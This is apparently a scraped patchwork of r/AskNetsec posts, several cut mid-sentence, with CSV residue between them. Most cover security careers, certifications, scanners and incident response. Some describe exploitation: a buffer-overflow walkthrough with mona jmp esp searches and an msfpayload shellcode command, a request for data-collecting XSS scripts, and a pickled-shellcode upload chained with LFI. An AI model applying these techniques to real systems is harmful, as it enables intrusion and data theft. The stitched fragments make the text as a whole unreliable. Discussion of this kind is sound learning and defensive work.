This is seen in this [image](URL #Jumping to Stack To jump to stack I need to find which modules are available for me, I also want to try and find an existing command which will jump me to stack. Using mona I can find out which modules are current [running](URL The module SLMFC looks like a good target due to it's lack of protections and lack of bad characters in the address. To find a jmp esp within this module I can again, use mona to search for the opcode of jmp esp within the module, knowing that the opcode for jmp esp is ffe4 I can use mona to search for [this](URL Ok, great. I can now jump to stack, I can put one of these addresses where the 4 B's are located and I will be able to jump to stack (taking care to ensure little edian values are respected). #Executing Shellcode So to generate shellcode I use metasploit `msfpayload windows/exec CMD=calc.exe R | msfencode -b '\x00\x0a\x0d'` which outputs the [following](URL I add this shellcode to my script, and I replace the C's with \x90 the opcode for NOP to ensure that the buffer length is the same length. I also add padding of 40 NOPs before the shellcode to enure the shellcode has enough space to work. So I have the following [code](URL at the moment, I can place a breakpoint at the return address and step through the stack to where my shellcode is executed, however I recieve an error and it doesn't execute my shellcode. A [gif](URL of what happens when I place a breakpoint on EIP and step through each instruction to the problem. I'm pretty new to buffer overflows and i'm unsure why this is happening.

Here's the scenario: One of the hosts I manage is a Apache/PHP server, running a few applications. It is pretty legacy, as I depend on developers on my company to migrate all the code for newer versions of PHP and a more hardened and enterprise-oriented environment. This guy runs Slackware 13.37, Apache 2.4.12 and PHP 5.4.7. Despite some flexible configs in terms of OS security, it has the basic set of rules for minimum security (sshd limited to mgmg network, root login disabled and strong root password, only ports available publicly are 80 and 443). We have disabled in php.ini most functions that could lead to shell access within PHP applications, like dl, exec, passthru, shell_exec, system, etc. Apache runs as unprivileged user. With these in place, I figured even if there was a vulnerability in one of the poorly written applications, privilege escalation would not be possible and the operating system would be fine. My mistake. A few days ago we found log entries on other hosts for ssh login attempts (visibly automated, as it followed a pattern) coming from this host. Upon further investigating, I'm sure the host is compromised, but I can't tell how. Logs from the time of incident were unavailable, except for eth interface going into promiscuous mode. No trace and not likely that the attacker got in via SSH, I'm pretty sure the point of entry was some web application. There also was a file 'bios.txt' in /var/log, containing a list of IP addresses and owned by root, which, after some googling, lead me to a tool commonly referred to as 'gosh'. Basically, once an attacker is able to run code on the machine, he downloads this package, runs a set of scripts to scan the network for vulnerable SSH hosts and calls home. Any insights on how it would be possible for an attacker to escalate privilege and run this stuff on the system, coming in from a PHP remote code execution? Is it an option that it never left the PHP realm, running all this without shell access? Any hits on where I should look more carefully to better understand what happened?

I have already used this to upload an .aspx file with a small javascript to produce a alert box possibly showing a possible cross-site scripting attack. We would like to really take this a step further and really put the nail in the coffin as to not allow them to refute this vulnerability. Unfortunately my programming knowledge is limited and am wondering if there is a place I could find some javascipts to collect data from ether the server or the workstation accessing the URL to show what kind of data can be collected.

(clarifying here from comments) A startup I'm helping has a contract to provide business analytics services for a large corp. To qualify to be a service provider for the large corp, the startup has to complete an IT survey (assessment run directly on the infrastructure of the startup - not the large corp). The large corp just requires of all of its service providers to do a self-audit as part of the vetting. The survey includes 1000+ questions about security and incident reporting policies, procedures, etc -- and also requires submitting Vulnerability Assessment and Penetration Test reports. My thought is that the Vulnerability Assessment and Penetration Test reports may not be required -- or at least not as rigorous as assessing a server providing SaaS. The startup is really only providing business analytics services -- NOT hosting any data or server app. In fact, the startup has NO SERVERS at all -- just about 5 Macs, 2 printers, Netgear wifi router with firewall, &amp; 2 PCs used with LogMeIn for using some windows apps -- and they are using Google Drive for Work for doc storage. So, my questions are these: -- Is a Vuln Assessment and/or a Pentest even appropriate given that there are no servers? -- Should the reports include a SOC3 from Google or something, since Google Drive for Work is used to store the in-scope client data? -- Should I scan the Mac clients for security holes? -- Or can we somehow get away with reports that merely assess the external firewall/router? Based on feedback in comments thus far... To clarify. The startup is just providing services for business analytics on data. But to do business with this large company, that large company requires the startup to complete an IT survey -- which they require of all tech service providers across the board. It is NOT a Security Survey being done on the large company -- it is a survey done on the startup -- just a part of the process the large company uses to vet their service providers.

Have any of you heard about an attacker using the infosvr vector to gain access and replace/botch the router firmware? In my case, it's a Dark Knight. I got a call from my dad's ISP about some malicious activity, and based on traffic data from the national cyber security agency, they suspected it was most likely the router. The router functioned normally, but when it accepted login, the admin panel was shredded. The only text that would load was the wifi-box on the right - everything else, menus and links included, were missing. The issue persisted through several hard reboots. It was functionally impossible to issue any commands in GUI mode. Flashing the firmware using the restoration tool failed the first time (on 100% of system recovery no less), and oddly enough, just presented the same broken admin panel when it booted up again. For the second attempt, I noticed that while the router would enter recovery mode after being subjected to the routine specified by ASUS technicians, it would immediately exit recovery mode as soon as the tftp session was initiated. I went ahead and completed the attempt anyway, but all I did was semi-brick it as it failed on 99% and said ""Router not in recovery mode"". Now it will half-boot and flash leds making you think it's online again, but it actually doesn't boot anything useful. I have a few tricks to get it back up again, but I was mostly interested in what thoughts you guys might have about whether this is a faulty router/ROM corruption/etc or if an attacker maimed the firmware for increased persistence."

I have to pay extra for each subdomain. This would get ridiculously expensive when I am giving away free subdomains and could have thousands eventually. I am guessing all these services do is identify form inputs and try to identify sql injection and then look for patterns that cross reference with an exploit database. I had a look around at getting my own software but its ridiculously expensive (looked at acunetix and metasploit). Is there something out there that I can set up to scan my entire site regularly as a safe guard in case I do something silly and put it on my live site that doesn't cost a fortune? I don't have a lot of spare time. I am just looking for something that might catch something before a bot does. The amount of bot these days is crazy.

Also, there isn't any way of making notes for sites, which forces me to have it all ""hardcoded"" in the policy (for example the responsibility of a certain IP range).

The attack can not (realistically) be used by an attacker to redirect payments to them self, but they can redirect payments away from the core developers (the intended recipients). The fix (that I've told them) is to add a MAC to some network traffic they're already encrypting, but I haven't seen any movement in the project's github. I also don't think they're likely to fix it any time soon, if at all, because I'm just some random guy on the internet who says their system is broken. I've already written a script that discovers the new replacement values to put into the network traffic with a bit flipping attack (non trivial and pretty much the core of the vulnerability), but I haven't yet added it to a mitm proxy to do the attack in real time(I fucking hate networking) so I'm not sure if they will accept it without a complete exploit/ video or something of it in action. My questions are: How much more work should I do before it should be obvious to the devs that I know what I'm talking about and the vulnerability is real? How long should I wait before releasing everything if they don't seem interested in fixing it? throw away, because my real account would out the project in question. "

In the process of this cleanup, my boss asked me if I could find something that notified people when protocols get hacked, or are no longer considered safe. This way we could be more proactive, rather than wait for an audit to tell us we are using a bad protocol. As an example - lets say that for right now, NTLMv2 is considered safe. But tomorrow morning rolls around and overnight, NTLMv2 was breached and many are considering it a vulnerability that needs patched, or discontinued. Without browsing the internet for an hour a day and reading security related news, is there a way we could be notified? Right now it's very likely we wouldn't find out about the NTLMv2 breach until our next audit, where we would get dinged. Thanks in advance! Any suggestions or thoughts would be greatly appreciated.

My expertise doesn't go beyond nmap, but I'm very good at keeping everything working, getting backups, and updating. I keep all our clients Windows and RHEL/CentOS servers updated on a quarterly basis. They are all behind Sonicwall or Juniper appliances with current IPS/AV subscriptions. We have a RMM to keep workstations updated and a managed antivirus. First off, am I correct in thinking that there is a huge difference between penetration testing and vulnerability scanning? My understanding is the former is an active process that takes a few weeks and includes network scanning plus social engineering and physical access testing, to the point of checking if the file cabinets are locked. Vulnerability scanning is a script that runs on a schedule and outputs a report of open ports and unpatched devices at the gateway level (i.e. external). Secondly, is there any way for us to sign off on compliance requirements saying the client has passed a penetration test? (for small businesses, I am aware this is its own industry for medium to large businesses.

Without any type of security it seems like it would be too easy for someone to just waltz in and go to work.

I need to get it so that the shellcode is depickled and executed, but to do that I need a way to upload it as is. This is where I screwed myself - the admin panel allows the upload of files without being pickled, which I can then call using a LFI vulnerability (I have the source code and this worked on m y setup). There were hints on the application that the password would be something very simple, such as ""John123"". Unfortunately I went to the ""Forgot my Password"" page seeing if it would give a hint to the admins email, but instead it actually changed the admin password to something random.

The problem I have is that this sharing could wind up inadvertently disclosing a lot of inside observability information. But it might wind up okay in the end.

The role was described as ""software engineer - pen tester"" however it turned out that the role didn't exist. Nevertheless, as it was my first job and it was with a massive company I stuck it out ever since. The problem is that I've not had much chance to develop my infosec skills or to do much technically and I'm worried that my intended career path has been derailed. I'm fighting to get more relevant training such as SANS, CCNA and CREST but it has been tough. I fear I may even be worse off than when I first graduated, in terms of employability based on infosec expertise. * Judging from a couple of failed interviews last year, my current knowledge feels very entry-level and I'm pretty weak with web app testing. My Nmap skills were good but I didn't have a thorough enough understanding of SQLi, amongst other web app-related aspects (I didn't realise pen test companies put that much emphasis on web app). Obviously, practising things at home is the answer but could you folks point me in the right direction? Perhaps like what individual skills I could start off ""mastering"", to add to my repertoire. I'm also very interested in malware/vulnerability analysis that gets posted on r/netsec but these are usually way above my understanding. I regularly read cyber security news and I have a feeling it wouldn't take me long to get immersed again like I once was, however I struggle with self-study discipline so if you have any suggestions that are a bit more structured or course-orientated or 'engaging' that'd be a huge help.

Have these issues been properly addressed by chip manufacturers and software companies/maintainers? After some research, my (admittedly layperson) understanding is the following: - While Meltdown has largely been addressed by microcode patches, Spectre is of a much broader nature and basically no known software fix is known, short of disabling most forms of branch prediction entirely. - I initially thought that these bugs were Intel-specific, or at least x86-specific, but apparently Spectre has been demonstrated to work on every major chip architecture, and that it's basically inherent to every CPU that makes use of branch prediction (so virtually every chip constructed in the last 25 years). - To make matters worse, it is my understanding that chip manufacturers have no intention of properly mitigating the issue in a broad manner (at least until a completely novel architecture is developed with these issues in mind). All this sounds pretty worrying to a layperson like me. I understand no real-world exploits have been detected, but isn't it true that a Spectre-like exploit would be virtually undetectable without any additional information/context? If this is the case I would think it's incredibly unlikely that not one single hack/exploit/leak in the last two years was based on Spectre."

When buying a SIEM solution always remember that the best one is the more adaptable to the organizations infrastructure: environment, size, and budget. You are considering Qualys and Nessus for Vulnerability Scanner. Both solutions are capable at detecting and managing critical vulnerabilities: - The Qualys Cloud Platform includes a live, threat intelligence feed of real-time security updates as well as asset management and cloud/web application scanning. The interface is easy to manage and provides integrations with Splunk, a SIEM that you are considering to deploy. - Nessus classifies the vulnerabilities into risk-based classes and performs different scans: focused on PCI-DSS compliance, malware, and applications. It is easy to use but the report section could be improved. Regarding to the SIEMs, besides Splunk and AlienVault I would recommend LogRhythm, is a dedicated security vendor that delivers a robust product with built-in file integrity monitoring and host intrusion detection capabilities. It offers flexibility for companies of all sizes and ease of use when deploying and implementing.

How much weight does a Cybersecurity degree carry?,1,e8p606,https://www.reddit.com/r/AskNetsec/comments/e8p606/at_a_crossroads_careerwise_how_hard_is_the_cissp/,2019-12-10 21:55:12,"Firstly, this is a bit long, so I want to let you all know ahead of time that I appreciate the read and advice, I've been mulling this over for awhile and I'm taking this decision seriously, but I still can't make a firm decision either way (mostly hung up on the difficulties of the CISSP). I've settled upon the understanding that it is impractical for me to simultaneously study for a CISSP and attend a University full time for a Cybersecurity degree, but I don't know which path to take (or if I'm over-estimating the time sink of both). The university I've chosen is only full time, so I don't have the option of going part time and studying for the CISSP as well. However, the university has a ""Cybersecurity"" certificate that would take 1 semester to get, and that semester would potentially apply to the degree. Long story short, I'm finishing my CompTia trifecta in a couple of weeks, and I'm looking to reenter the workforce in the coming months, meaning I would only have the time to either get the CISSP or the university's Cybersecurity certificate (unless, again, I'm overestimating the workload and can somehow actually get both), and I want to look as appealing to possible employers as possible. After taking into account the fail rate of the CISSP, I'm thusly concerned about my ability to pass the CISSP and wasting the time and money when getting a certificate from a college would be a more ""sure"" thing (attempting to get the CISSP and failing would make me unable to get the college certificate before I'd need to get a job). I'm more of a visual learner, so I'm not sure how negatively that impact learning the CISSP material. I originally didn't want to go the college route at all, but I felt my resume was getting filtered out before it was seen by a human, because of the lack of a degree. However I find that a lot of people are going to college for Cybersecurity, so I want to fully integrate myself into the field before the general lot of them graduate and I have to compete with them. Additionally...I'm on a possible time constraint with the CISSP, as my former manager (who is the only one who *truly* knew what work I did and could attest to my experience qualification) is leaving the company in a month. HR would not be able to properly relay my experience in a way that ISC would accept. &amp;#x200B; Given my situation and insecurity of how to proceed, I turn to you, oh dear reddit, for advice. I suppose my questions are... \&gt;So I can properly understand the difficulties of the CISSP...if I had **no** real world ""security"" experience could I still get the CISSP in a reasonable amount of time just from studying? In this scenario, how many hours would you anticipate one would need to study? (Trying to understand a worse case scenario for a time sink) \&gt;If I could only enter the workforce with my 6-7 years of IT experience, and a CompTia trifecta plus either the certificate from the college or a CISSP, which would put me on a better path career-wise with my next job? \&gt;How much less appealing is a CySA+ than a CISSP to a potential employer? \&gt;How appealing does a Cybersecurity degree make me to employers?"

I am currently attending school full time for cybersecurity network forensics and intrusion investigation at one of the few schools in the country endorsed by NSA, Homeland Security and DC3. I have been unemployed this past year and focusing on school but have also been looking for my next big opportunity. My classes now are online so I can work a day job. I have probably applied to 75+ positions, desktop support, system admin, security analyst etc... My last job was essentially helpdesk and I hated it, being tied to a desk wearing a headset all day was just not for me and I was not utilizing my degree. I am looking for something mid level in the security or admin field. One thing I know is holding me back is not having a security clearance, seems like all the jobs I see posted require it. It also seems like lack of experience holds me back, I know I need experience but taking another helpdesk role will not help me. I want to be challenged and learn not reset passwords and reboot routers. Maybe its my resume, it could also by my geographical area (upstate NY). I have considered moving to a major city for a couple years to gain some experience in the field. I have less than a year left to obtain my degree but didn't think that would deter potential employers since I am pursuing and doing well. I have gotten interviews but they were for entry level help desk roles that did not pay well, I felt accepting would be a step back because other people working the role had no tech experience or a degree Not that I am better but I have already put my time in helpdesk and have been a nerd my whole life so I have the fundamentals. I have also thought maybe getting some certs like security+ and network+ would help. Another problem is even though I am 33 I essentially have the same experience of someone 10 years younger than me that has just graduated. Unfortunately I am not in my 20's living home with my parents so I can't afford to take unpaid internships or entry level wages because I do live on my own and have bills. I am open to any and all advice and will also post a link to my resume if anyone wants to give me some feedback. [URL"

First and foremost our undergrad and graduate level education costs are bankrupting many of our youth leaving college and for many it's a burden that carries on for years and impacts your family lives. I was one of those who did it the hard way by not going to college but yet affirmed in my kids the need for college to be competitive in society - you can't open HR doors without the certificate - at least that was the thinking but now it's changed somewhat. I recommend as an alternative for some of the best hands on training you can get anywhere for those just out of high school - take a break and join the military - yes the military BUT only if you can get a guarantee of a cybersecurity position. Each and every one of our armed services organizations have teams that focus on this and many in partnership with our 3-letter agencies. What you can learn in 4 years while getting paid for it is truly amazing - BUT only if you have the mindset to deal with the crap of authoritative control that those who outrank you would have. In my mind the top two services would be the US Navy and US Air force followed by the US Army, Coast Guard (same some of the same military schools as the US Navy) then the US Marines. Think about it - you serve your country and become a veteran whom our nation seems to be respecting more often nowadays, you get paid, fed, housed and medical care while you learn on the job and in some cases coveted security clearances. Then when you leave you get the newer version of the GI Bill which provides you help if you still choose to go to college. In the end you learn a skill that can last you a lifetime without being in debt for the rest of your life because of college funding. Many firms from small to large purposely seek highly qualified military personnel who are transitioning to civilian life. The skills the US Navy taught me have served me for 40+ years and counting. Who knows, a side benefit often for younger folks is the ability to learn self-discipline and help becoming more responsible - I've seen it over and over again in my own extended family - something many firms recognize and also seek.

I know from firsthand experience how hard OSCP is: took the course once but didn't even attempt the exam  so thinking on leaving those for last, after I get some chops. But maybe that's wrong? Thought about maybe going for Sec+ first cause it's ""easier"" than the others and a good way to break in/warm up?

Just got my foot in the door with an IT company not long ago. It's got me pretty motivated so for the first time I'm trying to make a 5 year plan for myself. My end goal is pen testing. As some background, all I have is the A+ I'm working in Sec+ now. I hope to have that done by September when the new CCNA books are released then take the new CCNA when it's available. Alongside that I plan to start going to a community college for an AS in math because it transfers better than the computer science AS. Then a compsci/cybersecurity degree, but probably CS. Obviously this leaves a hole for certs. I would love to jump right into hackthebox and similar websites. As well as take part in CTH events and then work towards OSCP. Is this super unrealistic? Should I go for smaller certs like Pentest+ or CySA+ to advance my career(pay) in the meantime? Would Cisco security certs be better than CompTIA (I think this is a yes)? I can't afford the expensive sans or giac certs. People say CEH isn't worth it either. So that leaves me kind of lost. It seems like everything is outshined by the OSCP. It's even the top requirement at the SOC at my company. All the reading I've done on this sub and other related subs say just to skip to the OSCP if possible, but that's a huge leap to me and I'm scared to mentally commit to it if it's too much."

The player must try to pick the Ace out of those 3 cards, which are faced down so the player cannot see. After a player selects a card, without the player seeing the card he/she selected, the game's host reveals one of two Queens that were faced down. Then the player can either stick with the card he/she chose, or switch the card to the other faced-down card other than the revealed Queen card. &amp;#x200B; Erickson interprets that the player must switch the card because it will raise the probability of getting the Ace from 33% to 50%. He describes this as one of ""counterintuitive"", ""little-known truths."" But this problem reminded me of Monty Hall problem, which seems to have exactly same rules. But the Monty Hall problem's conclusion is that the player must switch the choice as it will raise the probability of choosing the right choice from 33% to 67%, not 50%. &amp;#x200B; Can anyone tell me if the ""Find the Ace"" game is a Monty Hall problem?

Help?",3,cfgk9h,https://www.reddit.com/r/AskNetsec/comments/cfgk9h/got_my_first_infosec_job_info_security_analyst/,2019-07-20 12:17:32,"After having spent the last 8+ years working for a small MSP and climbing their ranks from Network Analyst to ""Regional Technical Manager"", I've finally got an InfoSec job. (I've always been interested in cybersecurity.) It's for a local utility, and this is a new position for them. I am the only person doing InfoSec there. Luckily, the expectations seem to be realistic as they realize this is kind of being built from ground zero and they are willing to invest in most any kind of training for me. Starting off, they almost want me to be a ""security coordinator"" for the IT dept, working with the admins to correct security issues. The guidelines starting out are based off an assessment they had done last year that was not very good (hence this position). So I'm supposed to use that and NIST to be my road map starting out. So I've got my previous network/system admin experience from the MSP, some familiarity w/HIPPA from some of those previous clients (which I see a good bit of similarity with what I'm seeing in the assessment recommendations and NIST), and I'm in the home stretch of practice testing for Sec+ just because I'd seen it listed on other job specs and the subject matter was applicable here and didn't cost an arm and a leg (*ahem*, GIAC). The spec for this position said the candidate chosen would need to get a GIAC cert within the first year, but the boss is saying he is reconsidering that. I'm pretty sure if I said, ""no, I'd really like to if possible"", that they would go ahead and pay for it and the training. So my question is, what would you all suggest as far as books, courses, and/or certs to go for to try to get up to speed as fast as possible? And also, suggestions on making a good impact ASAP in this new position? I've asked if we could get quotes on a SIEM system like Splunk Cloud, because right now, there's no centralized log aggregation. They're all on their respective devices and really the only thing in the way of IDS/IPS is a Palo Alto. Thank you all in advance. Any suggestions will be *greatly* appreciated!"

I studied international relations and Spanish for 3 years with a emphasis in security studies, took some time off for work and travel, explored different interests and went to design school, then pretty much maxed out my undergraduate student loans. I could return and finish my university studies in about a year or two, even switch into cybersecurity or intel studies, but I'll need to pay down some debt owed to the school and probably pay for most of my courses out of pocket as my student loans are almost peaked and piling on interest.

I realize I'm kinda in the honeypot for gov and defense contractors here in NoVA but currently do not have a clearance, and I'd probably need to clean up my finances significantly before being able to pursue one, as well as I have very personal contacts in Colombia and Venezuela that might just throw up too many red flags, would this be problematic pursuing something in the private sector?

Some quick background; I'm 24 and live in the DC Metro area. I got my bachelors in IT 2 years ago and have been working as a SOC analyst since at 2 separate companies. I had an internship doing QA for two summers previous, and after a couple months of searching post grad I got my first real infosec job as an analyst in a ""soc like"" environment, only a bit more relaxed. I'm still doing the same kind of work now but have found at my current position I'm not really learning much, as if I've stagnated. Other than normal 'Tier 1' type analysis I don't have many opportunities to learn more technical skills on the job. I do some threat intel as well and luckily there is some downtime that I am allowed to use to develop other skills like brushing up on python, studying for certs, etc. but I've become pretty restless. I've never really been ""trained"" at any of these jobs I've kind of had to just learn it on the fly. I consider myself pretty alright at my job all things considered. I took to it quickly and do enjoy some aspects of it, however I've always been interested in getting into penetration testing. Reading stories of cool red team exercises is actually what made me want to focus on security in the middle of my generic IT education at school. &amp;#x200B; I enrolled in UMUC's online Master's program for CyberSecurity Technology and have completed one out of 6 required courses. I've come to regret it a bit, I often feel like I should have just paid for a course for the OSCP cert and been focusing on that instead of spending thousands on another degree that I'm unsure will give me that much of an advantage or even teach me all that much, and it aint cheap. I make good money now and can afford to pay for the courses out of pocket, but this also sacrifices savings and I'm not sure if it would be worth it in the long run vs saving for a house. My employer will help pay for some of it but it will mean I have to stay here for 2 additional years after I finish the degree which I'm definitely not keen on. There is a middle path, after 3 of the 6 courses I can apply for a graduate certificate and then have the option of finishing the master's down the line if I want. This is what I'm leaning towards atm since I've already dropped the 4 grand on the first class. &amp;#x200B; I guess my main question is, will the overall cost of this degree (\~24k) be worth it over the course of my career. I'm getting the feeling that I won't get a ton of technical knowledge coming out of this degree, it would be more for the degree itself and any connections I make during. Though to be fair to the school, the first class was the basic ""how to write a paper and use excel"" type extra money grabbing course so I'm unsure if that can be an indication of the more technically focused classes. &amp;#x200B; TLDR: Is it worth it to get a master's degree?

827,cybersecurity,AskNetsec,New to the industry and two offers on the table... need some advice,16,ca48oa,https://www.reddit.com/r/AskNetsec/comments/ca48oa/new_to_the_industry_and_two_offers_on_the_table/,2019-07-07 17:22:38,"I recently graduated with a BS in Cyber Security and have two CompTIA certifications, Security+ and Cybersecurity Analyst+. It's been a couple months worth of interviews between two companies, and now I sit with offers on the table for both. The money is similar enough that it does not play a role in the decision. The position for both companies would be an entry level Information Security Analyst. My biggest question is which of these two companies would provide the best opportunities for continuing education (as in certifications and on-the-job learning) and look better on a resume in five years (not that I plan on leaving in five years, just want an idea of how they will be viewed)? I will not be naming the companies in order to maintain some semblance of anonymity. &amp;#x200B; 1. This company offers managed security services and bills itself as Cyber Security As A Service. They have a lot of customers (I don't know how many exactly). They have a dedicated incident response team. They offer other services such as digital forensics, vulnerability assessment, threat monitoring, log management, red team assessments, etc. Exposure to several companies in several industries (entertainment, legal, banking, etc). 2. This company is a large privately held corporation (20,000+ employees globally). I would be on the security team doing daily security tasks. I imagine tasks would be similar to what I would be doing for the company one above. Exposure to one company in one industry. &amp;#x200B; Having no experience in the field of information security yet, I'm unsure what the positives/negatives would be to each of these types of companies and which will benefit my career the best in the long term. I know there's probably a hundred variables that could be added to these to weigh the pros and cons, but I'm hoping there's enough information there for some general guidance. &amp;#x200B; Any and all advice would be greatly appreciated. Thank you!"

I've ended up with information security being a significant part of my job and I am considering a career in that direction. Some background: I have a degree in Physics and nearly 20 years of mixed experience in science/technology including project management. The last 5ish years I've been the solo IT person for a small aerospace company. I've setup our network and put everything in place including our IT/InfoSec policies and worked on our NIST 800-171 compliance. We also use AWS quite a bit and I have put all of that in place and I am training our workforce on using it. I am currently working on a degree in information technology management and my PMP. The university I am at also offers a MS in cybersecurity management and a certificate in the same. My question is this: With the IT management degree and PMP completed, and perhaps CISSP/CISM, do you think I'd be able to transition to an information security management position for a larger organization given my background? I would have no significant experience as an infosec analyst or engineer but a few years experience in IT and software development project management. I am weighing InfoSec vs. a focus on software processes. Any feedback is most welcome!"

I really like the field, and usually like to read up on papers on my own, but I realized that this left me missing a big chunk of the actual content / work experience which I now realize is far more important than I previously thought. I am young and have made a handful of mistakes in my life, probably more than most people in their lifetime, and I am trying to recover from them and change my attitude to be more on top of things. I have studied computers since a kid, as well as other fields like pharmacology in my free time, and just had a passion for learning about these subjects. **I realized too that I am awful at working in a team as well**, which is one of my main goals to work on as well as limiting my impulsiveness and sensitivity. I realized I took offence to things/comments too easily, and this was a vulnerability in myself that I have been trying to overcome, and I also became a ""people-pleaser"" while not looking at my own goals in life. My ego got the best of me and I believe I was too confident in some of my decisions, and became overconfident. I do not want to go for a security clearance if I am still struggling with mental health issues as I worry I will be a cause of an issue. At what stage is a security clearance needed? How do you remain so calm and collected under the stress of being in the infosec/netsec field? I know I hear the usual ""Shot of Whiskey"" joke for handling stress, but aside from that, how are you able to cope with the stress. I have been working hard on myself mentally and sorting through the thoughts of mine that cause me angst/issues so I can better understand them and where they stem from so I can move on and be functional, but I am just learning more and more that I was looking at the field from an inexperienced perspective. I now realize I have been at the high end of the [dunning kruger effect](URL thinking that I could learn all by myself just from reading papers but now I realize I lack true experience and am coming to realize I know a lot less than I thought I did. Or atleast I think so. Are there any good groups / mentorships for cybersecurity that can help lead me on the right path, because recently, I have been lost and having issues with trust and being on the right path. Also, I was wondering if young people in this field bring anything new innovation-wise, or is it just best to follow the older, more wiser mentors in everything they do. Thanks."

Last school year (freshman year) I was lucky to receive an internship opportunity for this summer, largely thanks to the side-projects I was a part of during the school year. The internship is going extremely well, and I have very high confidence that my employers will offer to bring me back next year due to the work I've managed to get done and the direction they're headed in. It's at a smaller startup type company which has been doing quite well for itself after a recent re-branding. The company has two buildings: the one I am in focuses on manufacturing/production and has one other IT guy. The second building focuses entirely on software development. The production site was victim to a substantial ransomware breach days after I received my offer letter, so there has been plenty to do. &amp;#x200B; This summer I was also part of a separate company's two day recruiting event. The company is a significantly larger international consulting firm, and I really enjoyed meeting some of their cybersecurity minds during the event. The company has extended an offer for the summer of 2020 (which I must accept or reject by July 3rd, 2019). It pays almost double what I am making at my current internship, along with a nice bonus. &amp;#x200B; The larger company offers much better pay and will be able to give me the specialized cybersecurity work and guidance I'm looking for. However, with the smaller, more startup-type company, I have been able to regularly interact with the company founder and other high profile executives. The other IT guy is my main supervisor, but I tend to report the major projects I've been working on to those executives. &amp;#x200B; I am trying not to boast. I know I am lucky to have this decision, but I'm unsure which direction to go. The larger company would let me specialize, early on and right where I would like to, along with a substantial pay increase and giving me a recognized name to put on my resume. But I feel that with the small company, even though I do a fair bit of help-desk stuff, I have better chances of moving up thanks to good networking opportunities. TL;DR: have to choose between startup where my work is more generalized, but I get to meet high profile entrepreneurs, or international firm with double the pay, more specialized work, and working under a recognized name, but fewer networking opportunities."

Read the SIEM logs 2. Endpoint Security (and the nightmare that is keeping windows happy with your software). 3. Operate the Qualys scanner (or equivalent) and nag everyone to patch their software or server or network infra. 4. Sit through seemingly endless meetings where you tell business app owners they can't do obviously insecure stuff. 5. Deal with PCI/HIPAA compliance. Do most CyberSecurity/Security roles look like this? It just seems like companies hire CyberSec/Sec guys to place them in meetings and make them read logs."

My actual experience goes back to when I was a teenager. I toyed with computers extensively, teaching myself how they work, along with some programming. My degree program utilized a lot of lab environments for the purpose of practical application. Building networks, subnetting, vulnerability exploitation, digital forensics, etc. are some examples of what we did. Other than that, I just don't have the professional experience. My question is this: what do you all recommend to be my next step in pursuing an IT career? I apologize if this is lengthy. I just wanted to provide some context. Thanks in advance. "

A little about how I got there - Most people who get SOC analyst roles are mostly ex-system admins or fresh computer science college grads looking to enter the lucrative InfoSec career. &amp;#x200B; My paths a little different as I started as a Sales Rep within Cybersecurity selling EDR, MDR, MSSP tools and Professional Services. I started as simple rep making calls, qualifying leads and passing those leads to my senior account managers. I did my job well and my on target earnings were pretty decent. The more I learned about cybersecurity the more fascinated I became and I just didn't want to be another 'sales guy' saying things I've been told by my superiors. I really wanted to learn how a SIEM works, how an IDS/IPS works, how EDR tools like CB response for e.g in a SOC works and learn things like device management and hunting for threats that bypass our perimeter defenses. I did well at my entry level sales role and then got approached by a much larger cybersecurity firm and became an Account Executive where I was making pretty decent money but I just didn't really enjoy it truth be told. I spent more time hanging out with the devs, engineers and SOC guys and asking them about their day to day life and what projects they were working on and what they found complex. To me they seemed more interesting than a bunch of sales guys talking about golf, sports or how they schmoozed their way into big accounts and stuff. I knew if I was going to do Sales for a long time I'd go mental although I did enjoy going to trade shows and conferences. The Paid hotels and lunches are pretty nice but living quarter to quarter is stressful. It was at that point that I realized that I needed to go deep into InfoSec as a cybersecurity analyst and not Business Development although I do possess skills like giving good presentations in a boardroom setting, talking to CISO's and IT directors, discussing regulatory and compliance requirements and discussing what their needs are at a high level and I have always taken a rather consultative approach than simply selling stuff. I want a secure long term career that I can thrive and grow in and that's lucrative globally. This led me to taking a HUGE pay cut from my current sales role and applying as a Tier 1 SOC analyst at the age of 33 to get my fingers dirty and to work in the front lines. I understand that this can be a pretty boring job especially if you're just triaging thousands of alerts from different kinds of SIEMs (Logrhythm, Splunk and Qradar primarily) and escalating those alerts to Tier 2 and on-wards. The MSSP that hired me for Tier 1 said that after 1 year you move to a Tier 2 role with a 20% increase in salary and after 15 months to a Technical Account Manager Role or If I want to dive deeper into the the technical incident response side of things, I can possibly move into the CSIRT team by the end of my 2nd year assuming I've gotten the right certs under my belt. Now SOCs say a lot of things to hire people for Tier 1 analyst roles but this particular SOC is one of the largest SOCs in Canada with some REALLY massive accounts under their belt. I realized that you can have an excellent SOC but if you don't have the right clients you don't learn much as an Analyst and this particular SOC has some insanely impressive clients that use many different types of SIEMS and security stacks. I have a rough idea on the path I want to take which is going into **Professional Services Consulting** primarily working on the perimeter defense and incident response side of things. **My end goal is the help different organizations with implementing various security tools and optimizing those tools and help with Incident Response - I need to know how I can get there from a Tier 1 SOC analyst role** &amp;#x200B; I am already studying for Security+ and plan on giving my GIAC:GSEC within the next 6 months and possibly work towards a CySA+ or CISM next year. I don't have any programming skills so going into a Red team is out of the picture although I do enjoy tinkering with Kali Linux and I have Security Onion installed on another system. Here's my plan but I don't know if it's the right plan which is why I need some help on these forums. If any Security Consultants that have gone through the SOC can shed some light I'd be forever appreciative. Given my age I'd like to move quick and fast and learn as much as I can in the next 4-5 years. Year 1 - Work as a Tier 1 SOC analyst while getting your Security+ and GIAC: GSEC Year 2 - Work as a Tier 2 SOC analyst while working towards your CISM OR as a Technical Account Manager Year 3 and 4 is where I'm a bit lost on How I can get more perimeter defense implementation and incident response (DFIR) skills Year 5 - ??? Now I've been doing Cybersecurity Sales for over 3 Years so I know alot about what the industry is like, key partners, players and the types of technologies that are in the market. What's disruptive and what's fluff, what's true tried and tested and what's new and shiny etc. I know super long post and apologies in advance but any advice would be greatly appreciated."

